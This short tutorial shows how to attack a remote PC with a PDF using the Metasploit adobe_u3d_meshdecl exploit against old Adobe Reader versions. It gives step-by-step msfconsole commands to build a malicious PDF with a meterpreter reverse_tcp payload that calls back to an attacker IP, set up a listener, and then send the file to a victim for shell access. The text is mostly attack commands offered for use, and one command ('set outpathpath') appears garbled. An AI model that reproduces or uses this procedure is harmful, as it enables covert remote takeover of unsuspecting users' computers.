How to Attack on Remote PC through PDF

This module exploits an array overflow in Adobe Reader and Adobe Acrobat. Affected versions include < 7.1.4, < 8.2, and < 9.3. By creating a specially crafted pdf that a contains malformed U3D data, an attacker may be able to execute arbitrary code.
Adobe Reader and Acrobat Professional prior to version 9.3
Acrobat prior to version 8.2
Adobe Reader 9.0.0
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/adobe_u3d_meshdecl
Msf exploit (adobe_u3d_meshdecl)>set outpathpath /home/desktop
Msf exploit (adobe_u3d_meshdecl)>set payload windows/meterpreter/reverse_tcp
Msf exploit (adobe_u3d_meshdecl)>set lhost 192.168.1.3 (IP of Local Host)
Msf exploit (adobe_u3d_meshdecl)>exploit

After we successfully generate the malicious PDF, it will stored on your local computer
/root/.msf4/local/msf.pdf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.3
exploit
Now send your msf.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer
